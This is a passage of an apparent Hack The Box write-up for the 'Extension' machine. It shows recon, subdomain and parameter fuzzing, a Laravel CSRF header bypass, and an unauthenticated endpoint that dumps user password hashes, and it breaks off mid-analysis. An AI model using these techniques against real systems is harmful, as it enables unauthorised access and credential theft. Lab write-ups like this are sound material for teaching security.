---
title: HTB: Extension
url: https://0xdf.gitlab.io/2023/03/18/htb-extension.html
date: 2023-03-18T14:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: hackthebox, htb-extension, ctf, nmap, subdomain, password-reset, laravel, feroxbuster, roundcube, gitea, burp, burp-repeater, laravel-csrf, wfuzz, api, hashcat, idor, firefox-extension, xss, filter, firefox-dev-tools, gitea-api, password-reuse, hash-extension, hash-extender, command-injection, deepce, docker, docker-escape, docker-sock, htb-altered, htb-backend, htb-backendtwo, htb-ransom, htb-intense, htb-feline
---

![Extension](https://0xdfimages.gitlab.io/img/extension-cover.png)

Extension has multiple really creative attack vectors with some unique features. I’ll start by leaking usernames and hashes, getting access to the site and to the email box for a few users. Abusing an IDOR vulnerability I’ll identify the user that I need to get access as next. I’ll enumerate the password reset functionality, and notice that only the last few characters of the token sent each time are changing. I’m not able to brute force a single token, but I can submit hundreds of resets set the odds such that I can guess a valid on in only a few guesses. With this access, I get creds for a Gitea instance, where I’ll find a custom Firefox extension. I’ll abuse that extension, bypassing the cross site scripting filters to hit the Gitea API and pull down a backup file from another user. That backup gives SSH access to the host, and some password reuse pivots to the next user. With this access, I’ll identify a hash extension vulnerability in the web application, and abuse that to access a command injection and get RCE in the website container. The Docker socket inside the container is writable, allowing for a simple container breakout.

## Box Info

| Name | [Extension](https://hackthebox.com/machines/extension)  [Extension](https://hackthebox.com/machines/extension) [Play on HackTheBox](https://hackthebox.com/machines/extension) |
| --- | --- |
| Release Date | [16 Jul 2022](https://twitter.com/hackthebox_eu/status/1547264627574185986) |
| Retire Date | 18 Mar 2023 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Extension |
| Radar Graph | Radar chart for Extension |
| First Blood User | 14:35:13[Sm1l3z Sm1l3z](https://app.hackthebox.com/users/357237) |
| First Blood Root | 16:52:37[Geiseric Geiseric](https://app.hackthebox.com/users/184611) |
| Creator | [irogir irogir](https://app.hackthebox.com/users/476556) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.171
Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-24 17:08 UTC
Nmap scan report for snippet.htb (10.10.11.171)
Host is up (0.10s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.92 seconds

oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.171
Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-24 17:08 UTC
Nmap scan report for snippet.htb (10.10.11.171)
Host is up (0.087s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 82:21:e2:a5:82:4d:df:3f:99:db:3e:d9:b3:26:52:86 (RSA)
|   256 91:3a:b2:92:2b:63:7d:91:f1:58:2b:1b:54:f9:70:3c (ECDSA)
|_  256 65:20:39:2b:a7:3b:33:e5:ed:49:a9:ac:ea:01:bd:37 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: snippet.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.07 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 18.04 bionic. The HTML title on port 80 includes the domain name `snippet.htb`.

### Subdomain Fuzz

Because there’s a domain name, I’ll look for other subdomains that may be hosted on the same IP using virtual host routing with `wfuzz`. I’ll start the fuzz with no filter, and on seeing that the number of characters isn’t constant on the default result, but the number of words is, add `--hw 896` and run again:

```

oxdf@hacky$ wfuzz -u http://snippet.htb -H "Host: FUZZ.snippet.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  --hw 896
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://snippet.htb/
Total requests: 4989

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000002:   200        96 L     331 W    5311 Ch     "mail"
000000019:   200        249 L    1197 W   12729 Ch    "dev"

Total time: 274.6613
Processed Requests: 4989
Filtered Requests: 4987
Requests/sec.: 18.16418

```

I’ll add `snippet.htb`, `mail.snippet.htb`, and `dev.snippet.htb` to my `/etc/hosts` file.

### snippet.htb - TCP 80

#### Site

The site is about managing “snippets” (presumably bits of code?):

[![image-20220614063509180](https://0xdfimages.gitlab.io/img/image-20220614063509180.png)](https://0xdfimages.gitlab.io/img/image-20220614063509180.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220614063509180.png)

Visiting the page by IP or by domain name doesn’t seem to change this page.

There are some employee names I’ll note. There are “Login” and “Register” links at the top right. The rest of the links don’t go anywhere.

The “Log In” link leads to `/login`, which presents a form:

![image-20220613152856259](https://0xdfimages.gitlab.io/img/image-20220613152856259.png)

I don’t see a good way to differentiate between user doesn’t exist and wrong password based on that error, but I also don’t know that I have any correct email addresses to compare against:

![image-20220613143119278](https://0xdfimages.gitlab.io/img/image-20220613143119278.png)

The “Forgot your password?” link goes to `/forgot-password`, which asks for an email address:

![image-20220613143152791](https://0xdfimages.gitlab.io/img/image-20220613143152791.png)

When I enter `0xdf@0xdf.htb` it tells me there’s no user with that email:

![image-20220622140405385](https://0xdfimages.gitlab.io/img/image-20220622140405385.png)

I can probably brute-force usernames this way if it comes to that.

The “Register” link goes to `/register`, which offers another form:

![image-20220613143232094](https://0xdfimages.gitlab.io/img/image-20220613143232094.png)

If I try to use an email that’s not `@snippet.htb`, it complains:

![image-20220613152709910](https://0xdfimages.gitlab.io/img/image-20220613152709910.png)

If I switch the `snippet.htb`, it just says registration is closed:

![image-20220613152758381](https://0xdfimages.gitlab.io/img/image-20220613152758381.png)

#### Tech Stack

The HTTP response headers show the same NGINX information `nmap` identifies:

```

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 14 Jun 2022 10:35:52 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Host: snippet.htb
Cache-Control: private, must-revalidate
pragma: no-cache
expires: -1
Set-Cookie: XSRF-TOKEN=eyJpdiI6ImgrVFBvaXg2UUFUbTdDcTZ5QkwxQmc9PSIsInZhbHVlIjoiUDRwWjlBK3kwSWpYTW1zRU94SWRrMkJDQkVlZXlBdzl5RkxLNlk1WUprZzNGSWhXdzVLcmJ6Z3dDUkZUZHovSzZUUzhNYjF1dk5PUURCaDN5QVQvMjdEMXhadFFaeDJZRXltdWpKdmlSN1hhV3o0N3k5UXVqOUxLOGd0U2VRUVQiLCJtYWMiOiI4MWExYzcxYzMzMDJhN2E5ZDZhOWI3MGY1ZDkxNTRiZmY3YmY4ZmZlM2JkM2Y2MTZjODAxOTRkOGUwYzNhZjdkIiwidGFnIjoiIn0%3D; expires=Tue, 14-Jun-2022 12:35:52 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: snippethtb_session=eyJpdiI6IjZSU2YwRGpPTTZ6cEhsVFNyVnlLNmc9PSIsInZhbHVlIjoiZXJFdHQ5Z0E2UVJnSlZITWh2U3RoU3YzdW1vcTZzc1ZmZG1haGNiVWpDWmNZWkkvYVMvU2FDRnVsdTVDNFZxdC9zVjVyaUcyYlZDa2pjc0Rkc2pUbzdpS1d2MW55UEx0blZxb1lvRjFFVC9Fdys3b2tVMHA0YzF4NlZBVmRmRmQiLCJtYWMiOiIzMDllZmEwNjgwYTQ3ZjNjNGQzMWY1YWRhZWY1YTM3NDhlNjMzNjJhZmVmZDhjYTNjNjRhYzU5MWExZTJjNjdhIiwidGFnIjoiIn0%3D; expires=Tue, 14-Jun-2022 12:35:52 GMT; Max-Age=7200; path=/; httponly; samesite=lax
Content-Length: 37812

```

There’s two cookies set, but they don’t give away much about the environment. They do look a bit like the cookies that the PHP framework [Laravel](https://laravel.com/) sets, and it is configurable in Laravel to change `laravel_session` to something else, but nothing conclusive. For example, here’s the headers from [Altered](/2022/03/30/htb-altered.html#tech-stack):

```

HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Connection: close
Cache-Control: no-cache, private
Date: Wed, 30 Mar 2022 13:14:29 GMT
Location: http://10.10.11.159/login
Set-Cookie: XSRF-TOKEN=eyJpdiI6IjEvaE5oTjdualQrcG1PcUNodTNwUFE9PSIsInZhbHVlIjoiNFJDVzRJYWRDQVlCY3g5cG43WXM5SjlwLzF6QTFra2RTRVJTOWdnTkNPVC9aL1BhQmE2UVhCUzFKb0xYaXUxcTdMVmhXRFRQNU9UbE9VdmkxOWc5Wm1wRFNhNzFhOEt4NTNoVWQrK0Y4NXpiOTloMW5Zb0hVUnZ4N05NM2lwclgiLCJtYWMiOiI5OWZmNzdjZDdhOWU1OTNjMjczMTFmMmY5NDQzY2FmZDA3YmZhMGI2MGFmODNiMGM5MmRkOGU2NmUxMTc2MDA3IiwidGFnIjoiIn0%3D; expires=Wed, 30-Mar-2022 15:14:29 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: laravel_session=eyJpdiI6ImNMbzNvcitDclBuQWZSUUNFQnkzZEE9PSIsInZhbHVlIjoieVd0UUNRUlo5d1dwamRJZ3JRV1RFL0RqeHFkOVZ3MnpndE1DVVVCdS9tOHJOdDNVaGFyK1RjMTJkeGU5Ykp3WGtYRFFsT2M0S2gycEJITmYzcUxHcnFtOTZUT01tdWQ5aUQ5MlJPcGlaWWptODhxVjlxUWNoczUvVjVFOW0yd24iLCJtYWMiOiJiNjNkMWUyN2Q4N2ZjYzhkNjkxMjdjNTJlZjY2MGNjMmNkZDdiMDMxOTc1MmQ0ZmVhZGYyYWI1OTg2MGFmMzBmIiwidGFnIjoiIn0%3D; expires=Wed, 30-Mar-2022 15:14:29 GMT; Max-Age=7200; path=/; samesite=lax
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Content-Length: 346

```

While that’s inconclusive, this hunch is confirmed looking at the HTML and JavaScript for the page that comes back for `/`. It’s only 30 lines, as it’s using JavaScript to load most of the page. Lines 17-22 contain a huge block of inline JavaScript. On line 22, it loads `/js/app.js`:

[![image-20220624131258056](https://0xdfimages.gitlab.io/img/image-20220624131258056.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220624131258056.png)

There’s also references to `laravelVersion` (which isn’t defined, but still says likely Laravel), and `phpVersion` which is 7.4.30.

`/js/app.js` and the in-line JavaScript comprise the application that generates the page client-side. Looking at `app.js`, it starts off with comments talking about [Vue](https://vuejs.org/), a JavaScript framework:

[![image-20220613154040109](https://0xdfimages.gitlab.io/img/image-20220613154040109.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220613154040109.png)

It also has a few Laravel references:

[![image-20220615110938874](https://0xdfimages.gitlab.io/img/image-20220615110938874.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220615110938874.png)

This seems like a pretty good indication that the application is running Laravel on the server, and Vue on the client.

#### JavaScript Paths

The large block of in-line JavaScript starts by defining a variable `Ziggy` with the main URL and a series of routes:

![image-20220624131409460](https://0xdfimages.gitlab.io/img/image-20220624131409460.png)

With a bit of `cut`, `grep`, and `jq` I can get these in a nice JSON:

```

oxdf@hacky$ curl -s http://snippet.htb | grep 'const Ziggy' | cut -d= -f2 | jq .
{
  "url": "http://snippet.htb",
  "port": null,
  "defaults": {},
  "routes": {
    "ignition.healthCheck": {
      "uri": "_ignition/health-check",
      "methods": [
        "GET",
        "HEAD"
...[snip]...

```

With a bit more Bash-foo, I can make a nice list of names, uris, and methods:

```

oxdf@hacky$ curl -s http://snippet.htb | grep 'const Ziggy' | cut -d= -f2 | cut -d';' -f1 | jq -c '.routes | to_entries | .[] | {name: .key, uri: .value.uri, methods: .value.methods}'
{"name":"ignition.healthCheck","uri":"_ignition/health-check","methods":["GET","HEAD"]}
{"name":"ignition.executeSolution","uri":"_ignition/execute-solution","methods":["POST"]}
{"name":"ignition.shareReport","uri":"_ignition/share-report","methods":["POST"]}
{"name":"ignition.scripts","uri":"_ignition/scripts/{script}","methods":["GET","HEAD"]}
{"name":"ignition.styles","uri":"_ignition/styles/{style}","methods":["GET","HEAD"]}
{"name":"dashboard","uri":"dashboard","methods":["GET","HEAD"]}
{"name":"users","uri":"users","methods":["GET","HEAD"]}
{"name":"snippets","uri":"snippets","methods":["GET","HEAD"]}
{"name":"snippets.view","uri":"snippets/{id}","methods":["GET","HEAD"]}
{"name":"snippets.update","uri":"snippets/update/{id}","methods":["GET","HEAD"]}
{"name":"api.snippets.update","uri":"snippets/update/{id}","methods":["POST"]}
{"name":"api.snippets.delete","uri":"snippets/delete/{id}","methods":["DELETE"]}
{"name":"snippets.new","uri":"new","methods":["GET","HEAD"]}
{"name":"users.validate","uri":"management/validate","methods":["POST"]}
{"name":"admin.management.dump","uri":"management/dump","methods":["POST"]}
{"name":"register","uri":"register","methods":["GET","HEAD"]}
{"name":"login","uri":"login","methods":["GET","HEAD"]}
{"name":"password.request","uri":"forgot-password","methods":["GET","HEAD"]}
{"name":"password.email","uri":"forgot-password","methods":["POST"]}
{"name":"password.reset","uri":"reset-password/{token}","methods":["GET","HEAD"]}
{"name":"password.update","uri":"reset-password","methods":["POST"]}
{"name":"verification.notice","uri":"verify-email","methods":["GET","HEAD"]}
{"name":"verification.verify","uri":"verify-email/{id}/{hash}","methods":["GET","HEAD"]}
{"name":"verification.send","uri":"email/verification-notification","methods":["POST"]}
{"name":"password.confirm","uri":"confirm-password","methods":["GET","HEAD"]}
{"name":"logout","uri":"logout","methods":["POST"]}

```

There’s a bunch here, but one jumps out above the rest: `admin.management.dump`. I’ll enumerate that further in a bit.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@hacky$ feroxbuster -u http://snippet.htb/ -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://snippet.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      311c http://snippet.htb/images => http://snippet.htb/images/
301      GET        9l       28w      308c http://snippet.htb/css => http://snippet.htb/css/
301      GET        9l       28w      307c http://snippet.htb/js => http://snippet.htb/js/
405      GET       23l      105w        0c http://snippet.htb/logout
200      GET       29l      896w        0c http://snippet.htb/login
200      GET       29l      896w        0c http://snippet.htb/register
200      GET       29l      896w        0c http://snippet.htb/
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_snippet_htb_-1656091202.state ...
[>-------------------] - 15s      619/240000  1h      found:7       errors:96     
[>-------------------] - 15s      204/60000   14/s    http://snippet.htb/ 
[>-------------------] - 14s      110/60000   8/s     http://snippet.htb/images 
[>-------------------] - 14s      166/60000   10/s    http://snippet.htb/css 
[>-------------------] - 14s      120/60000   7/s     http://snippet.htb/js 

```

Brute forcing on this box is pretty slow… `feroxbuster` estimates it will take over an hour to complete the default scan with `raft-medium-directories`, so I’ll kill it. I can come back, but there are other brute forces I would prioritize over this one, like looking for subdomains. And I’ve got what looks like a solid list of endpoints from the JavaScript above.

### mail.snippet.htb - TCP 80

This looks like an instance of [RoundCube](https://roundcube.net/):

![image-20220615123321471](https://0xdfimages.gitlab.io/img/image-20220615123321471.png)

Looking in the page source, there’s a version:

[![image-20220615123504720](https://0xdfimages.gitlab.io/img/image-20220615123504720.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220615123504720.png)

Version 1.5.2 [released](https://roundcube.net/news/2021/12/30/update-1.5.2-released) 30 December 2021, which was right around when this box was submitted to HTB. RoundCube vulnerabilities doesn’t seem likely the intended path. I’ll come back when I have some creds.

### dev.snippet.io - TCP 80

This looks like a [Gitea](https://gitea.io/en-us/) instance:

[![image-20220615123655271](https://0xdfimages.gitlab.io/img/image-20220615123655271.png)](https://0xdfimages.gitlab.io/img/image-20220615123655271.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220615123655271.png)

At the bottom of the page is gives version 1.15.8, which was [released](https://blog.gitea.io/2021/12/gitea-1.15.8-is-released/) in December 2021. I’ll come back when I have creds.

## Authenticated Site Access

### Get Users from DB

#### Request Method

Returning to the `admin.management.dump` path I noted earlier, I’ll visit `/management/dump` in Firefox returns HTTP 405:

![image-20220615124530481](https://0xdfimages.gitlab.io/img/image-20220615124530481.png)

That makes sense, since the JSON said it accepts POST requests. If I intercept that same request in Burp and modify it (right click, “Change request method”):

![image-20220615124705018](https://0xdfimages.gitlab.io/img/image-20220615124705018.png)

It will change the rest to a POST. Forwarding that to the server, the response comes back 419:

![image-20220615124751742](https://0xdfimages.gitlab.io/img/image-20220615124751742.png)

#### CSRF Checks

Googling for Laravel 419 returns a bunch of links (like [this one](https://bobcares.com/blog/laravel-error-419-session-expired/)) that talk about common reasons for this, and one is a CSRF token failure:

> 1. CSRF token verification failure
>
> The most common reason for the 419 error is CSRF token failure. Cross-site request forgery token is a unique, encrypted value generated by the server.
>
> Laravel generates a CSRF token for each user session. The token verifies the user by requesting the application.
>
> So always include a CSRF token in the *HTML form* to validate the user request.
>
> The *VerifyCsrfToken* middleware automatically crosses checks the token in the request to the token stored in the session.
>
> In addition to CSRF token verification, the *VerifyCsrfToken* middleware also checks the *X-CSRF-TOKEN* request header.
>
> So, we store the token in the *HTML meta* tag. Then a library like jQuery can automatically add a token to all request headers. Therefore to fix the CSRF token failure we check the token in the application.

My request doesn’t have an `X-XSRF-TOKEN` request header. I can add that as a header (and un-url-encode the `%3D` to `=`), and it returns something new, “Missing arguments”:

[![image-20220615125226282](https://0xdfimages.gitlab.io/img/image-20220615125226282.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220615125226282.png)

Alternatively, I could have looked at a POST request to `/login`, and sent that to repeater. That request already has the `X-XSRF-TOKEN` header because that’s how the site naturally interacts with the server.

#### Identify Argument

The error indicates I need arguments, so I’ll start building a `wfuzz` command, adding additional headers and cookies until I get something returning the “Missing arguments” message. I’ll look at the `/login` POST as a reference:

```

POST /login HTTP/1.1
Host: snippet.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0
Accept: text/html, application/xhtml+xml
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/json
X-Inertia: true
X-Inertia-Version: 207fd484b7c2ceeff7800b8c8a11b3b6
X-XSRF-TOKEN: eyJpdiI6IkpqT0pWZDlQSzN4N3NhRnFCaVRHNHc9PSIsInZhbHVlIjoiZFFYQm5qR09YMXplSnJZaWtkVE1UTnRDa0hBTGFvZGxIMDdxMGg5azNuclZWMmVxSjF0a242dVdEbHhKckdXZjJvdHE3NVRiL0JoUVFlR1dwdVpqZ0E2d1kyY2FKRjlCK3EwblhsRGdKTTE3bTMvc2JjbXhtNTVOVUZUTEtoSGQiLCJtYWMiOiJkNTRjNzVlMjUxYTZhMzJlZDRkYWQ4MmUxZWRlZWQ2MDRlMDY1N2YyNDZiYmZmNjA1NGU2ZTNkY2YzOTExY2M2IiwidGFnIjoiIn0=
Content-Length: 65
Origin: http://snippet.htb
Connection: close
Referer: http://snippet.htb/login
Cookie: XSRF-TOKEN=eyJpdiI6IkpqT0pWZDlQSzN4N3NhRnFCaVRHNHc9PSIsInZhbHVlIjoiZFFYQm5qR09YMXplSnJZaWtkVE1UTnRDa0hBTGFvZGxIMDdxMGg5azNuclZWMmVxSjF0a242dVdEbHhKckdXZjJvdHE3NVRiL0JoUVFlR1dwdVpqZ0E2d1kyY2FKRjlCK3EwblhsRGdKTTE3bTMvc2JjbXhtNTVOVUZUTEtoSGQiLCJtYWMiOiJkNTRjNzVlMjUxYTZhMzJlZDRkYWQ4MmUxZWRlZWQ2MDRlMDY1N2YyNDZiYmZmNjA1NGU2ZTNkY2YzOTExY2M2IiwidGFnIjoiIn0%3D; snippethtb_session=eyJpdiI6IklVV2k3dlRQSXpGcis4TmZqRVBlTEE9PSIsInZhbHVlIjoiZGI2YWt5TXBXc0QvdzVxTExBcEJXVVFQNWUvN0VsSVdFc1JneVRNS1d5RGNWWFQrYXowdFhkUUhydzlDS1Mwa0hqOStDNW15ZUpYREdoRXZvSnJ5ZkVkcndIeWQ3WXBjem41cWNCRUUySlU1dW1ma3pTajgyV2FXUHkzYjBqcTgiLCJtYWMiOiIwOTFmNjRkMjQwYjFhNzg2YWM0YjFkOGE5ZmI2YzZlZDZjNGM3NWYzM2FiOWZkZTQwNWVlMjIxOWNhMDQxZWI5IiwidGFnIjoiIn0%3D

{"email":"admin@snippet.htb","password":"admin","remember":false}

```

I’ll need the `X-XSRF-TOKEN` header, both cookies, as well as the `Content-Type` header to send JSON (and the JSON payload). To make the command look slightly cleaner, I’ll save the long tokens in environment variables:

```

oxdf@hacky$ export XSRF='eyJpdiI6ImNYTm56dDFqc1Y2UXRwY0NnNXJvYmc9PSIsInZhbHVlIjoicUZRa3lJcEZPRlN0aklXZ3JLQ3ZhVXNrNzY0VHg4S3ZNWTJhUGk5S3hScG9jQ1FJbTR6QXYzTEp2MGp4MGpIQ0RzdjFXTmNwMnZqR09GQmpGYVpNQjhmMG5oV2l4QWw4Y09iclYyajhFMEVSZE16dzVkRFZqWFBjK3pSVUxhZ3EiLCJtYWMiOiIzZTlkNDExODRlMGJjMzE4MGYxMzdlODhkMGQ3ZDJlNDVhMjY4YTMwMzY0NGY2MTM4ZmFiZGViZjRiMzlkNTQ1IiwidGFnIjoiIn0=' 
oxdf@hacky$ export SESS='eyJpdiI6IklVV2k3dlRQSXpGcis4TmZqRVBlTEE9PSIsInZhbHVlIjoiZGI2YWt5TXBXc0QvdzVxTExBcEJXVVFQNWUvN0VsSVdFc1JneVRNS1d5RGNWWFQrYXowdFhkUUhydzlDS1Mwa0hqOStDNW15ZUpYREdoRXZvSnJ5ZkVkcndIeWQ3WXBjem41cWNCRUUySlU1dW1ma3pTajgyV2FXUHkzYjBqcTgiLCJtYWMiOiIwOTFmNjRkMjQwYjFhNzg2YWM0YjFkOGE5ZmI2YzZlZDZjNGM3NWYzM2FiOWZkZTQwNWVlMjIxOWNhMDQxZWI5IiwidGFnIjoiIn0%3D'
oxdf@hacky$ wfuzz -u http://snippet.htb/management/dump \
> -d '{"FUZZ": "0xdf"}' \
> -H "X-XSRF-TOKEN: $XSRF" \
> -b "XSRF-TOKEN=$XSRF"  \
> -b "snippethtb_session=$SESS" \
> -H "Content-Type: application/json" \
> -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
> --hs "Missing arguments"
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://snippet.htb/management/dump
Total requests: 6453

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000388:   404        36 L     123 W    6609 Ch     "_method"
000001856:   400        0 L      2 W      42 Ch       "download"

Total time: 529.2800
Processed Requests: 6453
Filtered Requests: 6451
Requests/sec.: 12.19203

```

I’m using `--hs` to hide responses that have “Missing arguments” in the body, which seems like a safe way to filter just the responses I want to remove. It finds `download`.

#### Fuzz Tables

Back in Repeater, I’ll update the POST payload to now have the `download` parameter. It shows a new error:

[![image-20220615132336477](https://0xdfimages.gitlab.io/img/image-20220615132336477.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220615132336477.png)

I’ll update the FUZZ to now look for that (I can probably guess a few while that runs):

```

oxdf@hacky$ wfuzz -u http://snippet.htb/management/dump \
> -d '{"download": "FUZZ"}' \
> -H "X-XSRF-TOKEN: $XSRF" \
> -b "XSRF-TOKEN=$XSRF"  \
> -b "snippethtb_session=$SESS" \
> -H "Content-Type: application/json" \
> -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
> --hs "Unknown tablename"
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://snippet.htb/management/dump
Total requests: 6453

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000004361:   200        0 L      1 W      2 Ch        "profiles"
000006164:   200        0 L      3581 W   272452 Ch   "users"                                                

Total time: 546.7470
Processed Requests: 6453
Filtered Requests: 6451
Requests/sec.: 11.80253

```

It finds two, `users` and `profiles`.

`profiles` returns nothing but an empty list:

![image-20220615135446605](https://0xdfimages.gitlab.io/img/image-20220615135446605.png)

This fits with the lengths reported by `wfuzz`, 1 word and 2 characters.

#### User Analysis

The `users` table has a lot. I’ll dump it into a file with `curl`:

```

oxdf@hacky$ curl -s http://snippet.htb/management/dump -d '{"download": "users"}' -H "X-XSRF-TOKEN: $XSRF" -b "XSRF-TOKEN=$XSRF"  -b "snippethtb_session=$SESS" -H "Content-Type: application/json" > users

```

This `jq` syntax will return one user per line:

```

oxdf@hacky$ cat users | jq -c .[]
{"id":1,"name":"Charlie Rooper","email":"charlie@snippet.htb","email_verified_at":"2022-01-02 20:12:46","password":"30ae5f5b247b30c0eaaa612463ba7408435d4db74eb164e77d84f1a227fa5f82","remember_token":"T8hTcYuS7ULTi73eYg7ZHhncyNucDKQb3VaUDfcotdEGaDESr3YsP9xUlJEQ","created_at":"2022-01-02 20:12:47","updated_at":"2022-06-20 14:46:28","user_type":"Manager"}
{"id":2,"name":"Davin Breitenberg","email":"davin@snippet.htb","email_verified_at":"2022-01-02 20:12:47","password":"98204173dffb1e65a20236e50914a7f3c2dfa6935ecc7de9dd341f7f5237ef05","remember_token":"XZV30CBMjU","created_at":"2022-01-02 20:12:47","updated_at":"2022-01-02 20:12:47","user_type":"Member"}
{"id":3,"name":"Calista Turcotte","email":"calista@snippet.htb","email_verified_at":"2022-01-02 20:12:47","password":"4683b63ef783ada656e0de04e6e88b61a220fdd8b36b90e1a2f906e500e4c640","remember_token":"s3LQKOuB4X","created_at":"2022-01-02 20:12:47","updated_at":"2022-01-02 20:12:47","user_type":"Member"}
{"id":4,"name":"Leora Larson","email":"leora@snippet.htb","email_verified_at":"2022-01-02 20:12:47","password":"70bf03b94c0c4d5a2c03ae4fe0fc8b56e5c19c02f7dff1ef8f6be781440fc21a","remember_token":"k8QnGxaTnB","created_at":"2022-01-02 20:12:47","updated_at":"2022-01-02 20:12:47","user_type":"Member"}
{"id":5,"name":"Stanford Veum","email":"stanford@snippet.htb","email_verified_at":"2022-01-02 20:12:47","password":"96663a849aa8784d51d3676f829fab6fd273eab2451114ee8c3e2c899475003f","remember_token":"WFwSMUyVf4","created_at":"2022-01-02 20:12:47","updated_at":"2022-01-02 20:12:47","user_type":"Member"}
{"id":6,"name":"Jamey Jacobi","email":"jamey@snippet.htb","email_verified_at":"2022-01-02 20:13:19","password":"9f0b7f6687f95e5a07ded6c79e5f0e3b2122ac273228ef9b608727dc06522e27","remember_token":"QTGhOqVa6P","created_at":"2022-01-02 20:13:19","updated_at":"2022-01-02 20:13:19","user_type":"Member"}
{"id":7,"name":"Elouise Hilpert","email":"elouise@snippet.htb","email_verified_at":"2022-01-02 20:13:19","password":"c742158037a4d44e54cc5020ebd3b032f39fc548318cf06702d6e5608d1a29cf","remember_token":"OYEBt7qDnS","created_at":"2022-01-02 20:13:19","updated_at":"2022-01-02 20:13:19","user_type":"Member"}
{"id":8,"name":"Ruthe Haag","email":"ruthe@snippet.htb","email_verified_at":"2022-01-02 20:13:19","password":"69641311b7d27167e4ef08e855ceeca63e4ecdb7f30b7afc6652dc26fd07a721","remember_token":"pwCYZipdUZ","created_at":"2022-01-02 20:13:19","updated_at":"2022-01-02 20:13:19","user_type":"Member"}
{"id":9,"name":"Camilla Hills","email":"camilla@snippet.htb","email_verified_at":"2022-01-02 20:13:19","password":"ff2c21005d7065681ba9cf8bf6b912403d97793227489fe8cbee5c9496313497","remember_token":"UdNL9yN3gv","created_at":"2022-01-02 20:13:19","updated_at":"2022-01-02 20:13:19","user_type":"Member"}
{"id":10,"name":"Amara Fahey","email":"amara@snippet.htb","email_verified_at":"2022-01-02 20:13:19","password":"948f4923d0d399e56ac2b0eda88fbead7fb238941bacecd6d439e4fbcddce0ea","remember_token":"VinL5AtB3r","created_at":"2022-01-02 20:13:19","updated_at":"2022-01-02 20:13:19","user_type":"Member"}
...[snip]...
oxdf@hacky$ cat users | jq -c .[] | wc -l
895

```

There are 895 users. Each user looks like:

```

{
  "id": 1,
  "name": "Charlie Rooper",
  "email": "charlie@snippet.htb",
  "email_verified_at": "2022-01-02 20:12:46",
  "password": "30ae5f5b247b30c0eaaa612463ba7408435d4db74eb164e77d84f1a227fa5f82",
  "remember_token": "T8hTcYuS7ULTi73eYg7ZHhncyNucDKQb3VaUDfcotdEGaDESr3YsP9xUlJEQ",
  "created_at": "2022-01-02 20:12:47",
  "updated_at": "2022-06-20 14:46:28",
  "user_type": "Manager"
}

```

`password` is interesting. The is a hex string that’s 64 characters long (plus the newline), which looks like a SHA256:

```

oxdf@hacky$ cat users | jq -r .[0].password | wc -c
65

```

Interestingly, there are only 892 unique password hashes:

```

